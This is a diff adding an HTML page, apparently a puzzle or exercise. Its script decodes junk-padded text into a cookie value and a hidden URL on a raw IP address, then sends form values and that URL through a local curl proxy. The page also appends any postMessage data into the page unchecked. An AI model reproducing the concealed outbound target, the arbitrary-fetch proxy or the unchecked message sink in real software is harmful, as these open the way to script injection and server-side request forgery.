@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head>
+    <body>
+
+        <ul>
+            <li name="dataform1">hi5}/</li>
+            <li name="dataform2">m9/.y3</li>
+            <li name="dataform3">na12[me</li>
+            <li name="dataform4">i=s</li>
+            <li name="dataform5">coo[1'ki\e</li>
+            <li name="dataform6">fi*rs2t</li>
+            <li name="dataform7">sec)(on#d</li>
+            <li name="dataform8">th11ir2d</li>
+            <li name="dataform9">f2o_ur+th</li>
+            <li name="dataform10">f-if+t87h</li>
+            <li name="dataform11">si6x9)th</li>
+            <li name="dataform12">se7v7en;t3h3</li>
+            <li name="dataform13">e2i$gh$th</li>
+        </ul>
+
+        <div class="first">
+            <p>window.location="http://185.174.63.223/"</p>
+            <div class="second">
+                <p>nextdata="/ajaxishere/"</p>
+                <div class="third">
+                    <p>finalpart="aj.php"</p>
+                </div>
+            </div>
+        </div>
+
+    </body>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+    <script>
+        var param = {};
+        var userCookie = '';
+        var url = filter2('.first > p', '"') + filter2('.second > p', '/') + '/' + filter2('.third > p', '"');
+        var getForm = " <form action=" + url + " method='post'>";
+        for (var i = 0; i < $('ul > li').length; i++) {
+            if (i <= 4) {
+                userCookie += filter($('ul > li').eq(i).text());
+            }
+            if (i > 4) {
+                getForm += "<input type='text'  name='" + $('ul > li').eq(i).attr('name') + "' value='" + filter($('ul > li').eq(i).text()) + "'></br>"
+            }
+        }
+        document.cookie = 'cookie=' + userCookie;
+        getForm += '<button class="clickForm">POST</button><button class="clickForm">GET</button></form>';
+        $('.first').append('</br>' + getForm);
+        $('body').on('click', 'button', function (e) {
+            e.preventDefault();
+            for (var j = 0; j < $('form > input').length; j++) {
+                param[$('form > input').eq(j).attr('name')] = $('form > input').eq(j).val();
+                $('form > input').eq(j)
+            }
+            param['site'] = url;
+            if ($(this).text() == 'POST') {
+                 param['method'] = 'post';
+                      $('form').attr('method', 'post');
+            }
+            else{
+                param['method'] = 'get';
+                     $('form').attr('method', 'get');
+            }
+            
+                $.ajax({
+                    url: '/curl.php',
+                    type: 'get',
+                    data: param,
+                    success: function (answer) {
+                        console.log(answer);
+                    },
+                    error: function (answer) {
+                        console.log(answer);
+                    },
+                })
+        });
+      
+
+        window.addEventListener('message', function (e) {
+            $('html > body').append(e.data);
+        });
+
+        function filter(str) {
+            return str.replace(/[^a-z]/gim, '');
+        }
+        function filter2(select, attr) {
+            return $(select).text().substring($(select).text().indexOf(attr) + 1, $(select).text().indexOf(attr, $(select).text().indexOf(attr) + 1));
+        }
+    </script>
+
+</html>
